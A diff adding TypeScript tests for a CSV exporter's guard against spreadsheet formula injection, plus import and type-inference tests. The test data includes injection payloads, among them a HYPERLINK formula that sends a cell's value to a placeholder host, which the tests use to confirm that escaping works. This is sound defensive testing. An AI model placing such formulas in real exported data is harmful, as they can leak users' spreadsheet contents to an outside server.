@@ -69,7 +69,55 @@ describe("import", () => {
   });
 });
 
+describe("formula guard", () => {
+  test("prefixes cells and headers that a spreadsheet would run", async () => {
+    const t = createTables(createMemoryStore());
+    const base = await t.createBase("B");
+    const table = await t.createTable(base.id, "T", [
+      { name: "=Name", type: "text" },
+      { name: "Note", type: "long_text" },
+      { name: "Stage", type: "single_select", options: ["-hot", "cold"] },
+      { name: "Tags", type: "multi_select", options: ["@a", "b"] },
+      { name: "N", type: "number" },
+    ]);
+    const evil = ['=HYPERLINK("http://x/?"&A1,"open")', "+1+1", "-2+3", "@SUM(1)", "\t=1", "\r=1"];
+    for (const [i, cell] of evil.entries()) await t.insertRow(table.id, { "=Name": cell, Note: cell, Stage: i === 0 ? "-hot" : "cold", Tags: ["@a"], N: -5 }, human);
+    const csv = toCsv(table, (await t.queryRows(table.id)).items);
+    const records = parseCsv(csv);
+    expect(records[0]).toEqual(["'=Name", "Note", "Stage", "Tags", "N"]);
+    for (const record of records.slice(1)) {
+      expect(record[0]!.startsWith("'")).toBe(true);
+      expect(record[1]!.startsWith("'")).toBe(true);
+      expect(record[3]).toBe("'@a");
+      expect(record[4]).toBe("-5");
+    }
+    expect(records[1]![2]).toBe("'-hot");
+    expect(records[2]![2]).toBe("cold");
+    for (const line of csv.split("\n").slice(0, 1)) expect(line.startsWith("=")).toBe(false);
+  });
+
+  test("a guarded header imports into the same table", async () => {
+    const t = createTables(createMemoryStore());
+    const base = await t.createBase("B");
+    const table = await t.createTable(base.id, "T", [{ name: "=Name", type: "text" }]);
+    expect(csvToValues(table, ["'=Name"], [["x"]])).toEqual([{ "=Name": "x" }]);
+  });
+
+  test("a header that lists a field twice is refused", async () => {
+    const t = createTables(createMemoryStore());
+    const base = await t.createBase("B");
+    const table = await t.createTable(base.id, "T", [{ name: "A", type: "text" }]);
+    expect(() => csvToValues(table, ["A", "A"], [["1", "2"]])).toThrow(ValidationError);
+  });
+});
+
 describe("inferFields", () => {
+  test("keeps zip codes, hex, and exponents as text", () => {
+    const header = ["zip", "hex", "exp", "big", "plain"];
+    const records = [["00123", "0x1F", "1e3", "12345678901234567890", "10"], ["90210", "0x2A", "2e2", "12345678901234567891", "-2.5"]];
+    expect(inferFields(header, records).map((f) => f.type)).toEqual(["text", "text", "text", "text", "number"]);
+  });
+
   test("infers types and falls back to text", () => {
     const header = ["n", "mixed", "flag", "day", "empty", "kind"];
     const rows = [
